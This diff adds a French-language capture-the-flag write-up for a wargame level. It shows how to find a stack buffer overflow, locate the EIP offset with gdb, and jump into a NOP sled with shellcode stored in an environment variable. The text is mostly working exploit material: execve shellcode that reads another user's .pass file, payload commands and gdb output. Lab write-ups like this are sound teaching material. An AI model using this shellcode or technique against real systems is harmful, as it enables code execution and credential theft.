@@ -1,0 +1,71 @@
+- Apres analyse du code asm, on se rend compte qu'il y a un overflow au 2eme fgets car
+on a buffer de 64 pour un fgets de 100
+- Le username doit etre "dat_wil"
+- On va faire un overflow afin de toucher l'eip afin d'executer du shellcode
+content dans l'environement
+
+1) On export le shellcode dans l'env
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus3/.pass; whoami; exit"'`
+
+2) Avec gdb on va check quelle taille de payload il faut utiliser pour
+modifier eip
+
+nano /tmp/test1
+
+python -c 'print "dat_wil"'
+python -c 'print "A" * 80 + "BBBB"'
+
+chmod 777 /tmp/test1
+gdb ./level1
+r < <(/tmp/test1)
+
+(gdb) r < <(/tmp/test1)
+Starting program: /home/users/level01/level01 < <(/tmp/test1)
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+==> On a le bon payload
+
+3) On chercher ensuite ou est contenu le shellcode dans la stack grace a gdb
+
+break main
+r
+x/1024xg $esp
+
+xffffde10:	0x3d44575000626467	0x73752f656d6f682f
+0xffffde20:	0x6576656c2f737265	0x474e414c0031306c
+0xffffde30:	0x552e53555f6e653d	0x544f5400382d4654
+0xffffde40:	0x9090909090903d4f	0x9090909090909090
+0xffffde50:	0x9090909090909090	0x9090909090909090
+0xffffde60:	0x9090909090909090	0x9090909090909090
+0xffffde70:	0x9090909090909090	0x9090909090909090
+0xffffde80:	0x9090909090909090	0x9090909090909090
+0xffffde90:	0x9090909090909090	0x9090909090909090
+0xffffdea0:	0x466a909090909090	0xeb80cdc931db3158
+0xffffdeb0:	0x665299580b6a5f21	0x2f6852e689632d68
+0xffffdec0:	0x6e69622f6868732f	0xe18953565752e389
+0xffffded0:	0x63ffffffdae880cd	0x656d6f682f207461
+0xffffdee0:	0x6c2f73726573752f	0x2e2f32306c657665
+
+==> On va pointer vers le milieu des nop et utiliser 0xffffde70
+
+- Exploit : 
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/users/level02/.pass; whoami; exit"'`
+
+nano /tmp/test1
+
+python -c 'print "dat_wil"'
+python -c 'print "A" * 80 + "\x70\xde\xff\xff"'
+
+chmod 777 /tmp/test1
+
+/home/users/level01/level01 < <(/tmp/test1)
